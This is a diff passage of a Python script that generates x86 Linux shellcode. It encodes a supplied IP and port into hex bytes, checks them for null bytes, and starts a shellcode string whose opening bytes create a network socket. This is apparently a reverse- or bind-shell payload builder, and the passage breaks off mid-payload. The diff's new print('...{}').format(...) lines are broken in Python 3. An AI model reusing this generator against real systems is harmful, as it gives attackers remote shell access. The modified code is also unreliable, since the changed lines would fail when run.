@@ -28,17 +28,17 @@ oct2 = int(ip[1]) + 1
 oct3 = int(ip[2]) + 1
 oct4 = int(ip[3]) + 1
 ip = str(oct1) + '.' + str(oct2) + '.' + str(oct3) + '.' + str(oct4) # join em all together
-print("Incremented raw IP was " + ip)
-ip = socket.inet_aton(ip).hex()
-ip = '\\x'+str(ip[0:2]) + '\\x'+str(ip[2:4]) + '\\x'+str(ip[4:6]) + '\\x'+str(ip[6:8])
+print("Incremented raw IP was {}").format(ip)
+ip = socket.inet_aton(ip).hex() #convert the ip into hex
+ip = '\\x'+str(ip[0:2]) + '\\x'+str(ip[2:4]) + '\\x'+str(ip[4:6]) + '\\x'+str(ip[6:8]) #break octets up and reattach with "\x"
 if ("00") in ip:
 	print ("ip contains nulls, try again!")
 	sys.exit()
 if ("00") in port:
 	print ("port contains nulls, try again!")
 	sys.exit()
-print("IP is: "+ ip)
-print("Port is: "+ port)
+print("IP is: {}").format(ip)
+print("Port is: {}").format(port)
 shellcode = ""
 shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
 shellcode += "\\x66\\x31\\xdb\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x89\\xc3\\x31"
